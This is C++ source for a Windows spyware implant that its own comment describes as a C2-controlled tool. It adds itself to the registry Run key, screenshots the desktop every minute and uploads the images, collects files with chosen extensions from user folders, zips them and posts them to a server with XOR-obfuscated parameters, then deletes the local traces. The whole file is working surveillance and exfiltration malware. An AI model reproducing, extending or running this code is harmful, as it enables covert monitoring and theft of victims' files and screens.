
/*
1. Get the C2's address via arguments (default is ==).

2. Register itself by creating a registry key in the 'Run' section of the Windows registry.

3. Capture the screen, save it as a file, and send it to the server. Repeat this every 1 minute.

4. Collect files with specific extensions and zip them (before doing so, check the registry first).

5. Send the zip file to the server.

*/

#include "Chinotto.h"

std::string mb_to_utf8(const std::string& mbstr)
{
    int wlen = MultiByteToWideChar(CP_ACP, 0, mbstr.c_str(), -1, NULL, 0);
    if (wlen == 0) {
        return std::string();
    }
    wchar_t* wbuf = new wchar_t[wlen];
    MultiByteToWideChar(CP_ACP, 0, mbstr.c_str(), -1, wbuf, wlen);

    int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, NULL, 0, NULL, NULL);
    if (len == 0) {
        delete[] wbuf;
        return std::string();
    }
    char* buf = new char[len];
    WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, buf, len, NULL, NULL);

    std::string result(buf);
    delete[] wbuf;
    delete[] buf;
    return result;
}


bool get_proc_name(std::string & proc_name) {
    DWORD pid = GetCurrentProcessId();
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (process == NULL) {
        std::cerr << "Failed to open process." << std::endl;
        return false;
    }

    char filename[MAX_PATH];
    if (GetModuleFileNameExA(process, NULL, filename, MAX_PATH) == 0) {
        std::cerr << "Failed to get process filename." << std::endl;
        CloseHandle(process);
        return false;
    }

    proc_name = filename;

    CloseHandle(process);
    return true;
}


bool register_autorun(std::string proc_name) {
    HKEY key;
    const std::string key_path = AUTORUN_PATH;
    const std::string value = AUTORUN_VALUE;

    // Open the key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) {
        std::cout << "Error: Unable to open registry key" << std::endl;
        return false;
    }

    // Check if the value exists
    DWORD type = REG_SZ;
    DWORD size;
    if (RegQueryValueExA(key, value.c_str(), NULL, &type, NULL, &size) != ERROR_SUCCESS) {

        if(RegSetValueExA(key, value.c_str(), 0, REG_SZ, (BYTE*)proc_name.c_str(), (strlen(proc_name.c_str()) + 1)) != ERROR_SUCCESS){
            RegCloseKey(key);
            return false;
        }

    }

    // Close the key
    RegCloseKey(key);
    return true;
}


std::string get_local_time() {

    SYSTEMTIME time;
    GetLocalTime(&time);

    char buffer[30];
    sprintf(buffer, "%04d-%02d-%02d.%02d_%02d_%02d.png",
        time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);

    std::string current_time(buffer);
    return current_time;
}

void capture_screen() {

    while(true){
        // Retrieve the local time to use as part of a file name
        std::string screen_path = SAVE_PATH + get_local_time();
        const char* filename = screen_path.c_str();
    
        // Get the desktop window and device context
        HDC desktop_dc = GetWindowDC(NULL);
        // Get the width and height of the screen
        int screen_width = GetSystemMetrics(SM_CXSCREEN);
        int screen_height = GetSystemMetrics(SM_CYSCREEN);

        // Create a bitmap compatible with the device context
        HDC memory_dc = CreateCompatibleDC(desktop_dc);
        HBITMAP bitmap = CreateCompatibleBitmap(desktop_dc, screen_width, screen_height);
        SelectObject(memory_dc, bitmap);
        // Copy the screen to the memory DC
        BitBlt(memory_dc, 0, 0, screen_width, screen_height, desktop_dc, 0, 0, SRCCOPY);
    
        //get the bitmap from the hbitmap
        BITMAP bmp_screen;
        GetObject(bitmap, sizeof(BITMAP), &bmp_screen);

        BITMAPFILEHEADER   bmf_header;
        BITMAPINFOHEADER   bi;

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp_screen.bmWidth;
        bi.biHeight = bmp_screen.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD bmp_size = 0;
        HANDLE dbi = NULL;
        char* lpbitmap = NULL;

        bmp_size = ((bmp_screen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp_screen.bmHeight;

        dbi = GlobalAlloc(GHND, bmp_size);
        lpbitmap = (char*)GlobalLock(dbi);

        // Gets the "bits" from the bitmap, and copies them into a buffer 
        // that's pointed to by lpbitmap.
        GetDIBits(desktop_dc, bitmap, 0,
            (UINT)bmp_screen.bmHeight,
            lpbitmap,
            (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        // Save the bitmap as a PNG file
        FILE* output_file = fopen(filename, "wb");
        png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
        png_infop info_ptr = png_create_info_struct(png_ptr);
        png_init_io(png_ptr, output_file);
        png_set_IHDR(png_ptr, info_ptr, screen_width, screen_height, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
        png_write_info(png_ptr, info_ptr);
        png_bytep* row_pointers = new png_bytep[screen_height];
        for (int y = 0; y < screen_height; ++y) {
            row_pointers[y] = new png_byte[screen_width * 4]; // each pixel has 4 bytes (RGBA)
            if (row_pointers[y] != NULL) {
                memcpy(row_pointers[y], (LPBYTE)lpbitmap + (screen_height - y - 1) * screen_width * 4, screen_width * 4);
            }
            else {
                fprintf(stderr, "[ERROR] Fail to create screenshot\n");
            }
        }

        png_write_image(png_ptr, row_pointers);
        png_write_end(png_ptr, NULL);
        png_destroy_write_struct(&png_ptr, &info_ptr);

        // Clean up
        fclose(output_file);
        GlobalUnlock(dbi);
        GlobalFree(dbi);
        delete[] row_pointers;
        DeleteObject(bitmap);
        DeleteDC(memory_dc);
        DeleteDC(desktop_dc);
        
        std::this_thread::sleep_for(std::chrono::minutes(1));

        if (false == send_to_server(filename)) {
            fprintf(stderr, "[Error] Failed to send <%s> to the server\n", filename);
        }

    }
}

void save_file(const fs::path& file_path, const fs::path& save_dir){

    // Construct the path to the new file in the save directory
    fs::path savePath = save_dir / file_path.filename();

    // Copy the file to the save directory
    try
    {
        fs::copy_file(file_path, savePath);
        std::cout << "Saved file: " << savePath << std::endl;
    }
    catch (const fs::filesystem_error& e)
    {
        std::cerr << "Error copying file: " << e.what() << std::endl;
    }
}

void enumerate_reculsively(const fs::path& dir_path, const fs::path& save_dir) {

    for (const auto& entry : fs::directory_iterator(dir_path))
    {
        if (fs::is_directory(entry.path()))
        {
            // Recursively enumerate files in subdirectories
            enumerate_reculsively(entry.path(), save_dir);
        }
        else if (fs::is_regular_file(entry.path()))
        {
            // Save the file if it has the desired extension
            DWORD cnt = sizeof(EXTENSIONS) / sizeof(*EXTENSIONS);
            while (cnt--) {
                if (entry.path().extension() == EXTENSIONS[cnt]) {
                    save_file(entry.path(), save_dir);
                    break;
                }
            }
        }
    }
}

bool collect_files() {

    // Create dir to collect files
    CreateDirectoryA(COLLECT_PATH, NULL);

    fs::path save_dir = COLLECT_PATH;
    
    DWORD idx = sizeof(CSIDL_LIST);

    while (idx--) {

        LPITEMIDLIST item_list = nullptr;
        char path[MAX_PATH] = { 0, };
        SHGetSpecialFolderLocation(NULL, CSIDL_LIST[idx], &item_list);
        SHGetPathFromIDListA(item_list, path);
        CoTaskMemFree(item_list);

        fs::path search_dir = path;

        enumerate_reculsively(search_dir, save_dir);

    }



    return true;

}


bool zip_dir() {
    const char* folder_path = COLLECT_PATH;
    const char* zip_path = ZIP_PATH;

    libzippp::ZipArchive zf(mb_to_utf8(zip_path).c_str());
    if (!zf.open(libzippp::ZipArchive::Write)) {
        fprintf(stderr, "[ERROR] Failed to open zip file\n");
        return false;
    }

    fs::path search_dir = folder_path;

    std::vector<std::string> file_list;

    try {
        for (const auto& entry : fs::directory_iterator(search_dir)) {
            if (fs::is_regular_file(entry.path())) {
                file_list.push_back(entry.path().string());
            }
        }
    }
    catch (std::exception& e)
    {
        fprintf(stderr, "[Error] failed to enumerate file : %s \n", e.what());
        std::cerr << "Error copying file: " << e.what() << std::endl;
    }

    for (auto& file : file_list) {

        int find = file.rfind("\\") + 1;
        std::string file_name = file.substr(find, file.length() - find);

        if (!zf.addFile( mb_to_utf8(file_name).c_str(), mb_to_utf8(file).c_str() ))
        {
            fprintf(stderr, "[ERROR] Failed to add file to archive: %s\n", file.c_str());
            return false;
        }
        else {
            fprintf(stderr, "filepath : %s \n file name : %s", mb_to_utf8(file).c_str(), mb_to_utf8(file_name).c_str());
        }
    }

    zf.close();
    
    if(true == fs::exists(zip_path)){
        if (send_to_server(zip_path)) {
            fprintf(stderr, "[Error] Failed to send <%s> to the server \n", zip_path);
            return false;
        }
    }

    return true;

}

bool check_test_mode() {
    HKEY key;
    const std::string key_path = TEST_MODE;
    const std::string value = TEST_VALUE;

    // Open the key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) {
        std::cout << "Error: Unable to open registry key" << std::endl;
        return false;
    }

    // Check if the value exists
    DWORD type = REG_DWORD;
    DWORD size;
    if (RegQueryValueExA(key, value.c_str(), NULL, &type, NULL, &size) != ERROR_SUCCESS) return false;

    return true;
}

std::string get_uid() {
    HKEY key;
    DWORD type;
    DWORD size;
    char buffer[1024] = { 0, };

    // Open the registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, UID_PATH, 0, KEY_READ, &key) == ERROR_SUCCESS) {

        size = sizeof(buffer);
        if (RegQueryValueExA(key, UID_VALUE, NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS) {
            fprintf(stderr, "[Error] Failed to read system uid from registry\n");
        }

        // Close the registry key
        RegCloseKey(key);
    }

    return std::string(buffer);
}


// Set up the callback function to write the received data to the buffer
static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp){
    size_t realsize = size * nmemb;
    std::string* buffer = static_cast<std::string*>(userp);
    buffer->append(static_cast<char*>(contents), realsize);
    return realsize;
}

std::string xor_string(const std::string& str, char key) {
    std::string result(str.length(), '\0');
    for (size_t i = 0; i < str.length(); ++i) {
        result[i] = str[i] ^ key;
    }
    return result;
}


bool send_to_server(std::string file_path) {

    std::string file_name = fs::path(file_path).filename().string();

    // Open the file
    std::ifstream file(file_path, std::ios::binary);

    // Check if file can be opened
    if (!file.is_open()) {
        fprintf(stderr, "[ERROR] Failed to open file %s \n", file_name.c_str());
        return false;
    }

    // Get the file size
    file.seekg(0, std::ios::end);
    size_t file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read the file into a buffer
    char* buffer = new char[file_size];
    file.read(buffer, file_size);
    file.close();

    // Initialize curl
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();

    // Build the URL with parameters
    std::stringstream ss;
    ss << SERVER_CONTROL_PAGE << 
        xor_string("type",7) << 
        "=" << xor_string("file",7) << 
        "&" << xor_string("uid",7) <<
        "=" << xor_string(get_uid(),7);

    std::string url = ss.str();

    // Build the HTTP POST request
    struct curl_httppost* post = nullptr;
    struct curl_httppost* last = nullptr;

    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_BUFFER, file_name.c_str(),
        CURLFORM_BUFFERPTR, buffer, CURLFORM_BUFFERLENGTH, file_size, CURLFORM_END);

    std::string response;
    // Set curl options
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    // Perform the request
    CURLcode res = curl_easy_perform(curl);


    // Check if request was successful
    if (res != CURLE_OK) {
        fprintf(stderr, "[Error] Failed to send request\n");
        return false;
    }
    
    // Clean up
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    delete[] buffer;


    if (std::remove(file_path.c_str()) != 0) {
        fprintf(stderr, "[Error] Failed to delete file\n");
        return false;
    }

    
    return true;

}

int main(int argc, char* argv[]){

    if (true == check_test_mode()) {
        MessageBoxA(NULL, "test", "test", NULL);
        return 0;
    }

    std::string proc_name;
    if (false == get_proc_name(proc_name)) {
        std::cerr << "[error] failed to geataa ." << std::endl;
        return 1;
    }
    
    if (false == register_autorun(proc_name)) {
        std::cout << "error: unable to set registry value \n" << std::endl;
        return 1;
    }

    
    collect_files();
    zip_dir();

    std::thread t(capture_screen);
    t.join();

    return 0;
}
